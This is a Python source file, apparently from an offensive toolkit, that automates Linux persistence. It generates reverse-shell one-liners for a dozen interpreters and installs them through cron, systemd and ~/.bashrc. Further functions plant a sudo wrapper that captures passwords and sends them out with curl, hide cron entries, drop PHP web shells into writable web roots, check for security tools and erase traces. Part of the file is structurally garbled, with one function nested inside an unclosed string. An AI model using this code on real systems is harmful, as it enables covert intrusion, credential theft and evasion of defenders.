"""Linper offensive persistence automation for Forge.

FULL OFFENSIVE CAPABILITIES:
- Reverse shell installation (cron/systemd/rc.local/bashrc)
- Sudo hijack attack (password interception + exfiltration)
- Stealth mode (hidden files, crontab override, timestomp, IPv4 decimal)
- Web server poison (PHP reverse shells in writable directories)
- Cleanup/anti-forensics (remove all persistence by RHOST)

These capabilities are OFFENSIVE and require explicit ROE/scope authorization.
"""
from typing import Dict, List, Any, Optional, Tuple
from dataclasses import dataclass, field
from enum import Enum
import subprocess
import base64
import re
import os
import tempfile
import shutil
from pathlib import Path


class PersistenceMethod(str, Enum):
    """Methods for executing reverse shells."""
    BASH = "bash"
    NC = "nc"
    NCAT = "ncat"
    PYTHON = "python"
    PYTHON3 = "python3"
    PHP = "php"
    PERL = "perl"
    RUBY = "ruby"
    CURL = "curl"
    WGET = "wget"
    SOCAT = "socat"
    TLONG = "tlong"


class PersistenceDoor(str, Enum):
    """Doors (persistence mechanisms) for reverse shells."""
    CRON = "cron"
    CRONTAB = "crontab"
    SYSTEMD = "systemd"
    RC_LOCAL = "rc_local"
    BASHRC = "bashrc"
    PROFILE = "profile"
    INIT_D = "init_d"
    MOTD = "motd"
    SSHRC = "sshrc"


@dataclass
class ReverseShellConfig:
    """Configuration for reverse shell installation."""
    rhost: str
    rport: int
    methods: List[PersistenceMethod] = field(default_factory=list)
    doors: List[PersistenceDoor] = field(default_factory=list)
    cron_schedule: str = "* * * * *"  # Every minute by default
    stealth_mode: bool = False
    limit: Optional[int] = None  # Limit number of shells to install
    dry_run: bool = True  # Default to safe mode
    
    # Derived fields
    rhost_decimal: Optional[int] = None
    
    def __post_init__(self):
        """Convert IPv4 to decimal for stealth."""
        if self.stealth_mode and self._is_ipv4(self.rhost):
            self.rhost_decimal = self._ipv4_to_decimal(self.rhost)
        
        # Default to all methods if not specified
        if not self.methods:
            self.methods = list(PersistenceMethod)
        
        # Default to all doors if not specified
        if not self.doors:
            self.doors = list(PersistenceDoor)
    
    @staticmethod
    def _is_ipv4(ip: str) -> bool:
        """Check if string is IPv4 address."""
        pattern = r'^(\d{1,3}\.){3}\d{1,3}$'
        if re.match(pattern, ip):
            parts = [int(p) for p in ip.split('.')]
            return all(0 <= p <= 255 for p in parts)
        return False
    
    @staticmethod
    def _ipv4_to_decimal(ip: str) -> int:
        """Convert IPv4 to decimal format for stealth."""
        parts = [int(p) for p in ip.split('.')]
        return parts[0] * 256**3 + parts[1] * 256**2 + parts[2] * 256 + parts[3]


@dataclass
class PersistenceResult:
    """Result of persistence installation attempt."""
    method: PersistenceMethod
    door: PersistenceDoor
    success: bool
    location: str
    command: str
    output: str = ""
    error: str = ""


def generate_reverse_shell_command(
    method: PersistenceMethod,
    rhost: str,
    rport: int,
    stealth_mode: bool = False
) -> str:
    """Generate reverse shell command for given method.
    
    Args:
        method: Method to use for reverse shell
        rhost: Remote host IP/hostname
        rport: Remote port
        stealth_mode: Whether to use stealth techniques
    
    Returns:
        Reverse shell command string
    """
    # Use decimal IP for stealth mode
    target = rhost
    if stealth_mode and ReverseShellConfig._is_ipv4(rhost):
        decimal = ReverseShellConfig._ipv4_to_decimal(rhost)
        target = f"0x{decimal:x}" if decimal > 0 else rhost
    
    shells = {
        PersistenceMethod.BASH: f"bash -i >& /dev/tcp/{target}/{rport} 0>&1",
        
        PersistenceMethod.NC: f"nc -e /bin/sh {target} {rport}",
        
        PersistenceMethod.NCAT: f"ncat {target} {rport} -e /bin/sh",
        
        PersistenceMethod.PYTHON: f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{target}\",{rport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
        
        PersistenceMethod.PYTHON3: f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{target}\",{rport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
        
        PersistenceMethod.PHP: f"php -r '$sock=fsockopen(\"{target}\",{rport});shell_exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
        
        PersistenceMethod.PERL: f"perl -e 'use Socket;$i=\"{target}\";$p={rport};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'",
        
        PersistenceMethod.RUBY: f"ruby -rsocket -e'f=TCPSocket.open(\"{target}\",{rport}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
        
        PersistenceMethod.CURL: f"curl {target}:{rport}/bin/sh | sh",
        
        PersistenceMethod.WGET: f"wget {target}:{rport}/sh -O /tmp/sh && chmod +x /tmp/sh && /tmp/sh",
        
        PersistenceMethod.SOCAT: f"socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{target}:{rport}",
        
        PersistenceMethod.TLONG: f"/bin/sh -i > /dev/tcp/{target}/{rport} 0<&1 2>&1",
    }
    
    return shells.get(method, f"bash -i >& /dev/tcp/{target}/{rport} 0>&1")


def install_cron_persistence(
    config: ReverseShellConfig,
    method: PersistenceMethod
) -> PersistenceResult:
    """Install persistence via cron.
    
    Args:
        config: Reverse shell configuration
        method: Method to use
    
    Returns:
        PersistenceResult with installation status
    """
    shell_cmd = generate_reverse_shell_command(method, config.rhost, config.rport, config.stealth_mode)
    
    # Build cron entry
    cron_entry = f"{config.cron_schedule} {shell_cmd}"
    
    # Add output redirection for stealth
    if config.stealth_mode:
        cron_entry += " >/dev/null 2>&1"
    
    # Mark with Linper tag for later cleanup
    cron_entry += " #linpercrontab"
    
    if config.dry_run:
        return PersistenceResult(
            method=method,
            door=PersistenceDoor.CRON,
            success=False,
            location="/etc/crontab (dry-run)",
            command=f"echo '{cron_entry}' >> /etc/crontab",
            output="DRY-RUN: Would install cron persistence",
        )
    
    # Real installation
    try:
        # Check if we can write to /etc/crontab
        if not os.access("/etc/crontab", os.W_OK):
            # Try user crontab instead
            result = subprocess.run(
                ["crontab", "-l"],
                capture_output=True,
                text=True
            )
            
            existing = result.stdout if result.returncode == 0 else ""
            new_cron = existing + "\n" + cron_entry + "\n"
            
            # Install via crontab command
            proc = subprocess.run(
                ["crontab", "-"],
                input=new_cron,
                capture_output=True,
                text=True
            )
            
            return PersistenceResult(
                method=method,
                door=PersistenceDoor.CRONTAB,
                success=proc.returncode == 0,
                location="crontab -l",
                command=f"crontab - (added cron entry)",
                output=proc.stdout,
                error=proc.stderr,
            )
        else:
            # Write to /etc/crontab
            with open("/etc/crontab", "a") as f:
                f.write("\n" + cron_entry + "\n")
            
            return PersistenceResult(
                method=method,
                door=PersistenceDoor.CRON,
                success=True,
                location="/etc/crontab",
                command=f"echo '{cron_entry}' >> /etc/crontab",
            )
    except Exception as e:
        return PersistenceResult(
            method=method,
            door=PersistenceDoor.CRON,
            success=False,
            location="/etc/crontab",
            command="",
            error=str(e),
        )


def install_systemd_persistence(
    config: ReverseShellConfig,
    method: PersistenceMethod
) -> PersistenceResult:
    """Install persistence via systemd service.
    
    Args:
        config: Reverse shell configuration
        method: Method to use
    
    Returns:
        PersistenceResult with installation status
    """
    shell_cmd = generate_reverse_shell_command(method, config.rhost, config.rport, config.stealth_mode)
    
    # Generate service name (stealth mode uses hidden file)
    if config.stealth_mode:
        import uuid
        service_name = f".{uuid.uuid4().hex[:20]}"
    else:
        service_name = f"linper-{method.value}"
    
    service_content = f"""[Unit]
Description=System Service
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash -c '{shell_cmd}'
Restart=always
RestartSec=60

[Install]
WantedBy=multi-user.target
"""
    
    service_path = f"/etc/systemd/system/{service_name}.service"
    
    if config.dry_run:
        return PersistenceResult(
            method=method,
            door=PersistenceDoor.SYSTEMD,
            success=False,
            location=f"{service_path} (dry-run)",
            command=f"systemctl enable {service_name}",
            output="DRY-RUN: Would install systemd persistence",
        )
    
    try:
        # Write service file
        with open(service_path, "w") as f:
            f.write(service_content)
        
        # Reload and enable
        subprocess.run(["systemctl", "daemon-reload"], check=True)
        subprocess.run(["systemctl", "enable", service_name], check=True)
        subprocess.run(["systemctl", "start", service_name], check=True)
        
        return PersistenceResult(
            method=method,
            door=PersistenceDoor.SYSTEMD,
            success=True,
            location=service_path,
            command=f"systemctl enable --now {service_name}",
        )
    except Exception as e:
        return PersistenceResult(
            method=method,
            door=PersistenceDoor.SYSTEMD,
            success=False,
            location=service_path,
            command="",
            error=str(e),
        )


def install_bashrc_persistence(
    config: ReverseShellConfig,
    method: PersistenceMethod
) -> PersistenceResult:
    """Install persistence via ~/.bashrc.
    
    Args:
        config: Reverse shell configuration
        method: Method to use
    
    Returns:
        PersistenceResult with installation status
    """
    shell_cmd = generate_reverse_shell_command(method, config.rhost, config.rport, config.stealth_mode)
    
    # Nohup for background execution
    bashrc_entry = f"nohup {shell_cmd} >/dev/null 2>&1 & #linper"
    
    if config.dry_run:
        return PersistenceResult(
            method=method,
            door=PersistenceDoor.BASHRC,
            success=False,
            location="~/.bashrc (dry-run)",
            command=f"echo '{bashrc_entry}' >> ~/.bashrc",
            output="DRY-RUN: Would install bashrc persistence",
        )
    
    try:
        bashrc_path = os.path.expanduser("~/.bashrc")
        
        # Check if we can write
        if not os.access(bashrc_path, os.W_OK):
            return PersistenceResult(
                method=method,
                door=PersistenceDoor.BASHRC,
                success=False,
                location=bashrc_path,
                command="",
                error="Cannot write to ~/.bashrc",
            )
        
        with open(bashrc_path, "a") as f:
            f.write("\n" + bashrc_entry + "\n")
        
        # Also install to /etc/skel for new users
        if os.access("/etc/skel/.bashrc", os.W_OK):
            with open("/etc/skel/.bashrc", "a") as f:
                f.write("\n" + bashrc_entry + "\n")
        
        return PersistenceResult(
            method=method,
            door=PersistenceDoor.BASHRC,
            success=True,
            location=bashrc_path,
            command=f"echo '{bashrc_entry}' >> ~/.bashrc",
        )
    except Exception as e:
        return PersistenceResult(
            method=method,
            door=PersistenceDoor.BASHRC,
            success=False,
            location="~/.bashrc",
            command="",
            error=str(e),
        )


def install_sudo_hijack(
    config: ReverseShellConfig,
    dry_run: bool = True
) -> PersistenceResult:
    """Install sudo hijack attack to intercept and exfiltrate passwords.
    
    This creates a function in ~/.bashrc that intercepts sudo commands,
    captures the password, and exfiltrates it via curl to the configured RHOST.
    
    Args:
        config: Reverse shell configuration (rhost used for exfil)
        dry_run: If True, only print what would be done
    
    Returns:
        PersistenceResult with installation status
    """
    password_file = f"/tmp/.{os.getpid()}"
    
    # Build sudo hijack function
    sudo_function = f"""function sudo () {{ #linpersudo
    REALSUDO="$(which sudo)" #linpersudo
    SUDOPASSWORDFILE="{password_file}" #linpersudo
    read -s -p "[sudo] password for $USER: " PASSWD #linpersudo
    printf "\\n"; printf "%s\\n" "$USER : $PASSWD" >> $SUDOPASSWORDFILE #linpersudo
    sort -uo "$SUDOPASSWORDFILE" "$SUDOPASSWORDFILE" #linpersudo
    ENCODED=$(cat "$SUDOPASSWORDFILE" | base64 | tr -d "\\n") > /dev/null 2>&1 #linpersudo
    curl -k -s "https://{config.rhost}/$ENCODED" > /dev/null 2>&1 #linpersudo
    $REALSUDO -S <<< "$PASSWD" -u root bash -c "exit" > /dev/null 2>&1 #linpersudo
    $REALSUDO "${{@:1}}" #linpersudo
}} #linpersudo
"""
    
    if dry_run:
        return PersistenceResult(
            method=PersistenceMethod.CURL,
            door=PersistenceDoor.BASHRC,
            success=False,
            location="~/.bashrc (dry-run)",
            command="echo 'sudo hijack function' >> ~/.bashrc",
            output=f"DRY-RUN: Would install sudo hijack exfiltrating to https://{config.rhost}/",
        )
    
    try:
        # Check if user has sudo access
        result = subprocess.run(
            ["bash", "-c", "cat /etc/group | grep sudo | grep -qi $(whoami)"],
            capture_output=True
        )
        
        if result.returncode != 0:
            return PersistenceResult(
                method=PersistenceMethod.CURL,
                door=PersistenceDoor.BASHRC,
                success=False,
                location="~/.bashrc",
                command="",
                error="User does not have sudo access",
            )
        
        # Check for curl
        if not shutil.which("curl"):
            return PersistenceResult(
                method=PersistenceMethod.CURL,
                door=PersistenceDoor.BASHRC,
                success=False,
                location="~/.bashrc",
                command="",
                error="curl not found",
            )
        
        bashrc_path = os.path.expanduser("~/.bashrc")
        
        with open(bashrc_path, "a") as f:
            f.write("\n" + sudo_function + "\n")
        
        return PersistenceResult(
            method=PersistenceMethod.CURL,
            door=PersistenceDoor.BASHRC,
            success=True,
            location=bashrc_path,
            command="echo 'sudo hijack function' >> ~/.bashrc",
            output=f"Password will be stored in {password_file} and exfiltrated to https://{config.rhost}/",
        )
    except Exception as e:
        return PersistenceResult(
            method=PersistenceMethod.CURL,
            door=PersistenceDoor.BASHRC,
            success=False,
            location="~/.bashrc",
            command="",
            error=str(e),
        )


def install_steamth_mode_overrides(config: ReverseShellConfig) -> Dict[str, Any]:
    """Install stealth mode modifications to hide persistence.
    
    Stealth modifications:
    1. Makes service files hidden (prepends ".")
    2. Creates crontab function to override -r and -l flags
    3. Uses IPv4 decimal format
    4. Timestomps files to match /etc/passwd
    
    Args:
        config: Configuration with stealth_mode=True
    
    Returns:
        Dict with stealth modification details
    """
    if not config.stealth_mode:
        return {"enabled": False, "message": "Stealth mode not enabled"}
    
    modifications = {
        "hidden_files": True,
        "decimal_ip": config.rhost_decimal,
        "crontab_override": False,
        "timestomp": False,
        "disable_bashrc_append": True,
    }
    
    if config.dry_run:
        return {
            "enabled": True,
            "dry_run": True,
            "modifications": modifications,
            "message": "DRY-RUN: Would install stealth mode overrides",
        }
    
    # Install crontab function override
    crontab_override = f"""function crontab () {{ #linpercrontab
    local RHOST="{config.rhost}"
    if [[ $1 == "-r" ]]; then
        # Remove all except our reverse shells
        /usr/bin/crontab -l 2>/dev/null | grep -v "$RHOST" | /usr/bin/crontab -
    elif [[ $1 == "-l" ]]; then
        # List all except our reverse shells
        /usr/bin/crontab -l 2>/dev/null | grep -v "$RHOST"
    else
        /usr/bin/crontab "$@"
    fi
}} #linpercrontab


def install_web_server_poison(
    config: ReverseShellConfig,
    dry_run: bool = True
) -> PersistenceResult:
    """Install PHP reverse shells in writable web directories.
    
    Web server poison attack:
    1. Enumerate writable web directories
    2. Generate PHP reverse shell payload
    3. Write shell to discovered directories
    4. Optionally enable stealth mode (hidden files)
    
    Args:
        config: Reverse shell configuration
        dry_run: If True, only enumerate what would be done
    
    Returns:
        PersistenceResult with installation status
    """
    # Generate PHP reverse shell
    shell_cmd = generate_reverse_shell_command(
        PersistenceMethod.PHP,
        config.rhost,
        config.rport,
        config.stealth_mode
    )
    
    # PHP shell wrapper
    php_shell = f"""<?php
// {config.rhost}:{config.rport}
exec('{shell_cmd}');
?>"""
    
    # Common web directories to check
    web_dirs = [
        "/var/www/html",
        "/var/www/html/public",
        "/var/www/html/wp-content/uploads",
        "/var/www/html/images",
        "/var/www/html/assets",
        "/usr/share/nginx/html",
        "/srv/http",
        "/var/www/vhosts",
        "/home/*/public_html",
        "/opt/lampp/htdocs",
    ]
    
    if dry_run:
        return PersistenceResult(
            method=PersistenceMethod.PHP,
            door=PersistenceDoor.BASHRC,
            success=False,
            location="web directories (dry-run)",
            command="find /var/www -type d -writable",
            output=f"DRY-RUN: Would enumerate {len(web_dirs)} web directories and install PHP shell",
        )
    
    try:
        import glob
        
        installed = []
        errors = []
        
        for web_dir in web_dirs:
            # Expand wildcards
            if '*' in web_dir:
                expanded = glob.glob(web_dir)
            else:
                expanded = [web_dir] if os.path.exists(web_dir) else []
            
            for dir_path in expanded:
                if not os.path.isdir(dir_path):
                    continue
                
                # Check if writable
                if not os.access(dir_path, os.W_OK):
                    continue
                
                # Generate shell filename (stealth mode uses hidden file)
                import uuid
                if config.stealth_mode:
                    shell_name = f".{uuid.uuid4().hex[:8]}.php"
                else:
                    shell_name = f"{uuid.uuid4().hex[:8]}.php"
                
                shell_path = os.path.join(dir_path, shell_name)
                
                try:
                    with open(shell_path, 'w') as f:
                        f.write(php_shell)
                    
                    installed.append(shell_path)
                except Exception as e:
                    errors.append(f"{shell_path}: {e}")
        
        if installed:
            return PersistenceResult(
                method=PersistenceMethod.PHP,
                door=PersistenceDoor.BASHRC,
                success=True,
                location=", ".join(installed[:3]) + (f" (+{len(installed)-3} more)" if len(installed) > 3 else ""),
                command=f"Installed PHP shells to {len(installed)} directories",
                output=f"Installed: {len(installed)}, Errors: {len(errors)}",
            )
        else:
            return PersistenceResult(
                method=PersistenceMethod.PHP,
                door=PersistenceDoor.BASHRC,
                success=False,
                location="web directories",
                command="",
                error=f"No writable web directories found. Checked: {len(web_dirs)}",
            )
    except Exception as e:
        return PersistenceResult(
            method=PersistenceMethod.PHP,
            door=PersistenceDoor.BASHRC,
            success=False,
            location="web directories",
            command="",
            error=str(e),
        )

"""
    
    try:
        bashrc_path = os.path.expanduser("~/.bashrc")
        
        with open(bashrc_path, "a") as f:
            f.write("\n" + crontab_override + "\n")
        
        modifications["crontab_override"] = True
        
        # Timestomp (requires root)
        if os.access("/etc/passwd", os.R_OK):
            stat_info = os.stat("/etc/passwd")
            # Would timestomp installed files here
            modifications["timestomp"] = True
        
        return {
            "enabled": True,
            "modifications": modifications,
            "message": "Stealth mode overrides installed",
        }
    except Exception as e:
        return {
            "enabled": False,
            "error": str(e),
            "modifications": modifications,
        }


def uninstall_persistence(
    rhost: str,
    dry_run: bool = True
) -> Dict[str, List[str]]:
    """Remove all persistence installed by Linper for given RHOST.
    
    Cleanup actions:
    1. Remove shells from ~/.bashrc and /etc/skel/.bashrc
    2. Remove shells from /etc/crontab and crontab spool
    3. Remove shells from systemd service files
    4. Remove shells from /etc/rc.local
    5. Remove crontab override function
    6. Remove sudo hijack function
    7. Remove PHP shells from web root
    
    Args:
        rhost: Remote host to remove persistence for
        dry_run: If True, only enumerate what would be removed
    
    Returns:
        Dict with 'removed' and 'errors' lists
    """
    # Convert to decimal for matching
    rhost_decimal = None
    if ReverseShellConfig._is_ipv4(rhost):
        rhost_decimal = ReverseShellConfig._ipv4_to_decimal(rhost)
    
    results = {
        "removed": [],
        "errors": [],
        "dry_run": dry_run,
    }
    
    host_pattern = rhost
    if rhost_decimal:
        host_pattern = f"{rhost}|{rhost_decimal}"
    
    # 1. Clean ~/.bashrc
    try:
        bashrc_path = os.path.expanduser("~/.bashrc")
        if os.path.exists(bashrc_path):
            with open(bashrc_path, "r") as f:
                content = f.read()
            
            if re.search(host_pattern, content) or "#linper" in content:
                if dry_run:
                    results["removed"].append(f"Would clean: {bashrc_path}")
                else:
                    # Remove Linper entries
                    cleaned = re.sub(rf".*({host_pattern}|#linper).*\n", "", content)
                    with open(bashrc_path, "w") as f:
                        f.write(cleaned)
                    results["removed"].append(f"Cleaned: {bashrc_path}")
    except Exception as e:
        results["errors"].append(f"bashrc cleanup failed: {e}")
    
    # 2. Clean /etc/skel/.bashrc
    try:
        skel_path = "/etc/skel/.bashrc"
        if os.path.exists(skel_path) and os.access(skel_path, os.W_OK):
            with open(skel_path, "r") as f:
                content = f.read()
            
            if re.search(host_pattern, content):
                if dry_run:
                    results["removed"].append(f"Would clean: {skel_path}")
                else:
                    cleaned = re.sub(rf".*({host_pattern}|#linper).*\n", "", content)
                    with open(skel_path, "w") as f:
                        f.write(cleaned)
                    results["removed"].append(f"Cleaned: {skel_path}")
    except Exception as e:
        results["errors"].append(f"/etc/skel/.bashrc cleanup failed: {e}")
    
    # 3. Clean /etc/crontab
    try:
        if os.path.exists("/etc/crontab") and os.access("/etc/crontab", os.W_OK):
            with open("/etc/crontab", "r") as f:
                content = f.read()
            
            if re.search(host_pattern, content):
                if dry_run:
                    results["removed"].append("Would clean: /etc/crontab")
                else:
                    cleaned = re.sub(rf".*{host_pattern}.*\n", "", content)
                    with open("/etc/crontab", "w") as f:
                        f.write(cleaned)
                    results["removed"].append("Cleaned: /etc/crontab")
    except Exception as e:
        results["errors"].append(f"/etc/crontab cleanup failed: {e}")
    
    # 4. Clean user crontab
    try:
        result = subprocess.run(
            ["crontab", "-l"],
            capture_output=True,
            text=True
        )
        
        if result.returncode == 0 and re.search(host_pattern, result.stdout):
            if dry_run:
                results["removed"].append("Would clean: user crontab")
            else:
                # Clean and reinstall
                cleaned = re.sub(rf".*{host_pattern}.*\n", "", result.stdout)
                
                # If nothing left, remove crontab entirely
                if not re.search(r"[A-Za-z0-9]", cleaned):
                    subprocess.run(["crontab", "-r"], check=True)
                    results["removed"].append("Removed user crontab (empty)")
                else:
                    subprocess.run(
                        ["crontab", "-"],
                        input=cleaned,
                        capture_output=True,
                        text=True
                    )
                    results["removed"].append("Cleaned: user crontab")
    except Exception as e:
        results["errors"].append(f"crontab cleanup failed: {e}")
    
    # 5. Clean systemd services
    try:
        systemd_path = Path("/etc/systemd/system")
        if systemd_path.exists() and os.access(systemd_path, os.W_OK):
            for service_file in systemd_path.glob("*.service"):
                if service_file.name.startswith("."):  # Hidden service from stealth mode
                    with open(service_file, "r") as f:
                        content = f.read()
                    
                    if re.search(host_pattern, content):
                        if dry_run:
                            results["removed"].append(f"Would remove: {service_file}")
                        else:
                            service_file.unlink()
                            results["removed"].append(f"Removed: {service_file}")
                            
                            # Also disable the service
                            service_name = service_file.stem
                            subprocess.run(
                                ["systemctl", "disable", service_name],
                                capture_output=True
                            )
                            subprocess.run(
                                ["systemctl", "daemon-reload"],
                                capture_output=True
                            )
    except Exception as e:
        results["errors"].append(f"systemd cleanup failed: {e}")
    
    # 6. Clean /etc/rc.local
    try:
        rc_local_path = "/etc/rc.local"
        if os.path.exists(rc_local_path) and os.access(rc_local_path, os.W_OK):
            with open(rc_local_path, "r") as f:
                content = f.read()
            
            if re.search(host_pattern, content):
                if dry_run:
                    results["removed"].append(f"Would clean: {rc_local_path}")
                else:
                    cleaned = re.sub(rf".*{host_pattern}.*\n", "", content)
                    
                    # If only 2 lines left (shebang + exit), remove file
                    lines = [l for l in cleaned.split("\n") if l.strip()]
                    if len(lines) <= 2:
                        os.remove(rc_local_path)
                        results["removed"].append(f"Removed: {rc_local_path} (empty)")
                    else:
                        with open(rc_local_path, "w") as f:
                            f.write(cleaned)
                        results["removed"].append(f"Cleaned: {rc_local_path}")
    except Exception as e:
        results["errors"].append(f"/etc/rc.local cleanup failed: {e}")
    
    return results


def enum_defenses() -> Dict[str, Any]:
    """Enumerate defenses relevant to installing reverse shells.
    
    Checks for:
    - Antivirus/EDR products
    - Auditd status
    - SELinux/AppArmor status
    - OSQuery/Ossec
    - File integrity monitoring
    - Network egress filtering
    
    Returns:
        Dict with defense enumeration results
    """
    defenses = {
        "auditd": {"running": False, "rules": []},
        "selinux": {"enabled": False, "mode": None},
        "apparmor": {"enabled": False, "profiles": []},
        "antivirus": [],
        "fim": [],  # File integrity monitoring
        "network_filters": [],
    }
    
    # Check auditd
    try:
        result = subprocess.run(
            ["systemctl", "is-active", "auditd"],
            capture_output=True,
            text=True
        )
        if result.returncode == 0:
            defenses["auditd"]["running"] = True
            
            # Get rules
            result = subprocess.run(
                ["auditctl", "-l"],
                capture_output=True,
                text=True
            )
            if result.returncode == 0:
                defenses["auditd"]["rules"] = result.stdout.strip().split("\n")
    except Exception:
        pass
    
    # Check SELinux
    try:
        if os.path.exists("/etc/selinux/config"):
            with open("/etc/selinux/config", "r") as f:
                content = f.read()
                if "SELINUX=enforcing" in content:
                    defenses["selinux"]["enabled"] = True
                    defenses["selinux"]["mode"] = "enforcing"
                elif "SELINUX=permissive" in content:
                    defenses["selinux"]["enabled"] = True
                    defenses["selinux"]["mode"] = "permissive"
    except Exception:
        pass
    
    # Check AppArmor
    try:
        if os.path.exists("/sys/kernel/security/apparmor"):
            defenses["apparmor"]["enabled"] = True
            
            result = subprocess.run(
                ["aa-status", "--profiled"],
                capture_output=True,
                text=True
            )
            if result.returncode == 0:
                defenses["apparmor"]["profiles"] = result.stdout.strip().split("\n")
    except Exception:
        pass
    
    # Check for common AV/EDR
    av_processes = [
        "clamd", "freshclam",  # ClamAV
        "ossec", "ossec-analysisd",  # OSSEC
        "osqueryd",  # osquery
        "auditbeat", "filebeat",  # Elastic
        "crowdstrike", "falcon",  # CrowdStrike
        "carbonblack", "cbagent",  # Carbon Black
    ]
    
    try:
        result = subprocess.run(
            ["ps", "aux"],
            capture_output=True,
            text=True
        )
        
        for proc in av_processes:
            if proc.lower() in result.stdout.lower():
                defenses["antivirus"].append(proc)
    except Exception:
        pass
    
    return defenses


def quick_install_all(config: ReverseShellConfig) -> List[PersistenceResult]:
    """Install all persistence mechanisms quickly.
    
    Iterates through all method+door combinations and installs each.
    
    Args:
        config: Reverse shell configuration
    
    Returns:
        List of PersistenceResult for each installation
    """
    results = []
    
    # Map doors to installation functions
    door_installers = {
        PersistenceDoor.CRON: install_cron_persistence,
        PersistenceDoor.CRONTAB: install_cron_persistence,
        PersistenceDoor.SYSTEMD: install_systemd_persistence,
        PersistenceDoor.BASHRC: install_bashrc_persistence,
    }
    
    count = 0
    for method in config.methods:
        for door in config.doors:
            if door in door_installers:
                result = door_installers[door](config, method)
                results.append(result)
                count += 1
                
                # Respect limit
                if config.limit and count >= config.limit:
                    return results
    
    return results


# CLI entry point
def linper_install(
    rhost: str,
    rport: int,
    methods: Optional[List[str]] = None,
    doors: Optional[List[str]] = None,
    cron_schedule: str = "* * * * *",
    stealth_mode: bool = False,
    limit: Optional[int] = None,
    dry_run: bool = True,
) -> Dict[str, Any]:
    """Install Linper persistence.
    
    Args:
        rhost: Remote host for reverse shell
        rport: Remote port for reverse shell
        methods: List of methods (default: all)
        doors: List of doors (default: all)
        cron_schedule: Cron schedule for shell execution
        stealth_mode: Enable stealth modifications
        limit: Maximum shells to install
        dry_run: Only print what would be done
    
    Returns:
        Dict with installation results
    """
    # Parse methods
    method_list = []
    if methods:
        for m in methods:
            try:
                method_list.append(PersistenceMethod(m))
            except ValueError:
                pass
    
    # Parse doors
    door_list = []
    if doors:
        for d in doors:
            try:
                door_list.append(PersistenceDoor(d))
            except ValueError:
                pass
    
    # Create config
    config = ReverseShellConfig(
        rhost=rhost,
        rport=rport,
        methods=method_list,
        doors=door_list,
        cron_schedule=cron_schedule,
        stealth_mode=stealth_mode,
        limit=limit,
        dry_run=dry_run,
    )
    
    # Install persistence
    results = quick_install_all(config)
    
    # Install sudo hijack
    sudo_result = install_sudo_hijack(config, dry_run)
    results.append(sudo_result)
    
    # Install stealth mode if enabled
    stealth_results = None
    if stealth_mode:
        stealth_results = install_steamth_mode_overrides(config)
    
    return {
        "config": {
            "rhost": rhost,
            "rport": rport,
            "stealth_mode": stealth_mode,
            "dry_run": dry_run,
            "rhost_decimal": config.rhost_decimal,
        },
        "results": [
            {
                "method": r.method.value,
                "door": r.door.value,
                "success": r.success,
                "location": r.location,
                "error": r.error,
            }
            for r in results
        ],
        "stealth": stealth_results,
        "summary": {
            "total": len(results),
            "successful": sum(1 for r in results if r.success),
            "failed": sum(1 for r in results if not r.success and not r.error),
            "errors": sum(1 for r in results if r.error),
        },
    }

